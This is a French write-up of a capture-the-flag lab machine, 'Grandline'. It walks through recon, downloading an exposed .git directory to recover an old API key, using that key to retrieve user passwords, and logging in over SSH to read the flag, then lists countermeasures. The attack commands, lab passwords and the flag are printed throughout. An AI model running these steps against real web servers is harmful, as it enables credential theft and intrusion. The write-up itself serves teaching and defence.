---
author: Wallygator
date: 2026-10-06
version: 1.0.0
modification: Harmonisation du write-up
cve: Aucun CVE produit applicable ; CWE-538 et CWE-798
---

# Documentation : Grandline
# Documentation : Grandline

## 1. Contexte & Objectif

* **Cible** : `10.10.0.24`
* **Objectif** : retrouver le flag utilisateur dans `/home/zoro/user.txt`.

---

## 2. Reconnaissance initiale

On démarre par identifier les services exposés :

```bash
nmap -sV 10.10.0.24
```

Résultat :

```text
22/tcp   open  ssh
8081/tcp open  http
```

Le site web est une application Flask/Werkzeug sur le port `8081`.

---

## 3. Analyse du site web

On regarde la page d'accueil :

```bash
curl -i http://10.10.0.24:8081/
```

On pense au départ que `/login` est le bon point d'entrée, mais l'interface ne fait que servir l'affichage. La vraie piste est sur `/forgot` et sur l'API associée.

Les routes intéressantes sont :

```text
/
/login
/forgot
/api
```

La route `/forgot` contient un formulaire qui appelle une API :

```html
<form id="forgotform" action=# onsubmit="api();">
```

On a d'abord essayé de tester directement une injection SQL sur l'API, mais la réponse était toujours `Invalid API Key`, ce qui a montré que la piste SQLi n'était pas la bonne.

Le JavaScript associé révèle l'endpoint :

```javascript
xhttp.open("POST", "/api/retrieve-d-password/"+data, true);
```

Donc on a :

```text
POST /api/retrieve-d-password/<username>
```

### Erreurs rencontrées

* On a d'abord cru que `/login` était le point d'entrée principal, mais ce n'était qu'une interface statique.
* On a tenté une injection SQL sur l'API, sans succès : la réponse restait toujours `Invalid API Key`.
* On a aussi été tenté de s'arrêter au code historique du dépôt Git, sans tenir compte du fait que l'application utilisait une version locale modifiée.

---

## 4. Découverte du point clé : `.git` exposé

On vérifie si le dépôt Git est accessible :

```bash
curl -i http://10.10.0.24:8081/.git/HEAD
```

Réponse :

```text
HTTP/1.1 200 OK

ref: refs/heads/master
```

Le dépôt Git est donc exposé. C'est une mauvaise configuration critique.

On regarde aussi le reflog :

```bash
curl -s http://10.10.0.24:8081/.git/logs/HEAD
```

Et on trouve :

```text
Redact api key
```

C'est le bon indice.

---

## 5. Récupération de l'ancienne clé API

On récupère les objets Git et on lit l'ancien `app.py` :

```bash
curl -s http://10.10.0.24:8081/.git/objects/d2/7a2152301b4cc3457dcddece78a6d231b0d \
| python3 -c 'import sys,zlib; print(zlib.decompress(sys.stdin.buffer.read()).decode())'
```

Le code historique montre qu'une ancienne clé API existait :

```text
57db5c001c802fc4be25afb02cff9bf8
```

et un nom d'utilisateur historique : `admin`.

---

## 6. La contradiction et la vraie piste

On essaie la clé historique avec `admin`, mais le serveur répond :

```text
Invalid Username
```

Cela signifie que le code actuellement exécuté n'est pas celui du dernier commit Git.

Le vrai indice est :

```bash
curl -s http://10.10.0.24:8081/.git/COMMIT_EDITMSG
```

Réponse :

```text
Changes not staged for commit:
    modified:   app.py
```

Le serveur utilise donc une version locale modifiée de `app.py`.

Autre erreur classique ici : on a tenté de se baser uniquement sur le code historique du dépôt, sans tenir compte du fait que l'application réelle utilisait une version locale non commitée.

---

## 7. Trouver le bon username

En testant la clé historique sur plusieurs noms d'utilisateur du thème One Piece, on obtient :

```text
luffy  → ThisIsN0tMyPassword
zoro   → I_G07_L0S7_0Nc3_4G41n
```

Le bon compte pour SSH est donc `zoro`.

---

## 8. Accès SSH et récupération du flag

```bash
ssh zoro@10.10.0.24
```

Mot de passe :

```text
I_G07_L0S7_0Nc3_4G41n
```

Une fois connecté :

```bash
find / -name user.txt 2>/dev/null
```

Résultat :

```text
/home/zoro/user.txt
```

On lit le flag :

```bash
cat /home/zoro/user.txt
```

```text
EPI{1f_1_91V3_uP_noW_1m_9o1N9_7O_r39R37_17}
```

## 9. Contre-mesures

### Dépôt `.git` exposé

- Exclure `.git` du répertoire servi par le serveur web et bloquer explicitement son accès.
- Déployer uniquement les fichiers nécessaires, jamais l'historique ni les fichiers de travail.
- Considérer toute clé présente dans l'historique comme compromise : la révoquer et la remplacer.

### Clés API et mots de passe

- Stocker les secrets dans des variables d'environnement ou un gestionnaire de secrets, jamais dans le dépôt.
- Utiliser une clé distincte par environnement, avec une durée de vie et des droits minimaux.
- Pour SSH, préférer des clés protégées par passphrase et désactiver l'authentification par mot de passe si possible.

